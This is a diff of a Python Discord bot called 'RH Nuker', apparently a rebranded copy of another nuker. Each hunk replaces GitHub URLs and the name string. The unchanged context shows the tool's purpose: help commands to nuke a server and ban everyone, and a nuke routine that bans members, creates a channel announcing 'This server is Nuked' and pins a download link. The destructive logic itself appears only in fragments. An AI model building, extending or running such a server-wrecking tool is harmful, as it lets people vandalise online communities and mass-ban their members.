@@ -49,7 +49,7 @@ def checkVersion():
     if version == "":
         return ""
     req = requests.get(
-        "https://raw.githubusercontent.com/Rarementor46/RH-NUKER/main/version.txt")
+        "https://raw.githubusercontent.com/RH-hackers/RH-NUKER/main/version.txt")
     if req.status_code == requests.codes.ok:
         gitVersion = req.text.rstrip()
         if version == gitVersion:
@@ -82,7 +82,7 @@ print("""
 |__/  |__/|__/  |__/      |__/  \__/ \______/ |__/  \__/|________/|__/  |__/
 
 Author:  https://discord.com/invite/vzmvZYUCxg"
-GitHub:  https://github.com/ICEGXG/UntitledNuker""")
+GitHub:  https://github.com/RH-hackers/RH-NUKER""")
 
 
 """
@@ -188,7 +188,7 @@ async def help(ctx):
     p = bot.command_prefix
     embed = discord.Embed(title="Help", color=embedColor)
     embed.set_author(name="RH Nuker",
-                     url="https://github.com/Rarementor46/RH-NUKER")
+                     url="https://github.com/RH-hackers/RH-NUKER")
     embed.add_field(
         name="Nuke", value=f">>> `{p}1 <ban 1/0> <your text>`", inline=False)
     embed.add_field(name="Ban everyone", value=f">>> `{p}2`", inline=False)
@@ -221,7 +221,7 @@ async def help(ctx):
         name="Revive (DM Only)", value=f">>> Creating 1 text channel on server if you deleted all\n`{p}15 <guild id>`", inline=False)
     embed.add_field(name="Settings", value=f">>> `{p}settings`")
     embed.add_field(name="\u200b\nInfo",
-                    value=f">>> **RH Nuker**\nMade by <@1073316483075158066>\nVersion: {version} {checkVersion()}\nGitHub: https://github.com/Rarementor46/RH-NUKER\n", inline=False)
+                    value=f">>> **RH Nuker**\nMade by <@1073316483075158066>\nVersion: {version} {checkVersion()}\nGitHub: https://github.com/RH-hackers/RH-NUKER\n", inline=False)
     await ctx.message.author.send(embed=embed)
 
 
@@ -232,7 +232,7 @@ async def settings(ctx):
     embed = discord.Embed(
         title="Settings", description="Available settings\n`Only for owners`", color=embedColor)
     embed.set_author(name="RH Nuker",
-                     url="https://github.com/Rarementor46/RH-NUKER")
+                     url="https://github.com/RH-hackers/RH-NUKER")
     embed.add_field(
         name="Prefix", value=f">>> Change prefix\n`{p}settings prefix <prefix>`", inline=False)
     embed.add_field(
@@ -313,7 +313,7 @@ async def settingsWhitelist(ctx, action):
 
 @settings.command(name='activity')
 @commands.check(isOwner)
-async def settingsActivity(ctx, action, activityType="playing", *, text=f"Untitled Nuker v{version}"):
+async def settingsActivity(ctx, action, activityType="playing", *, text=f"RH Nuker v{version}"):
     global config
     global activity
     if action == "set":
@@ -398,7 +398,7 @@ async def nuke(ctx, ban: bool = True, text: str = "RH Nuker"):
     try:
         embed = discord.Embed(color=embedColor)
         embed.add_field(name="This server is Nuked",
-                        value="RH Nuker\nDownload: https://github.com/Rarementor46/RH-NUKER", inline=False)
+                        value="RH Nuker\nDownload: https://github.com/RH-hackers/RH-NUKER", inline=False)
         channel = await ctx.guild.create_text_channel(name="RH Nuker")
         message = await channel.send(embed=embed)
         await message.pin()
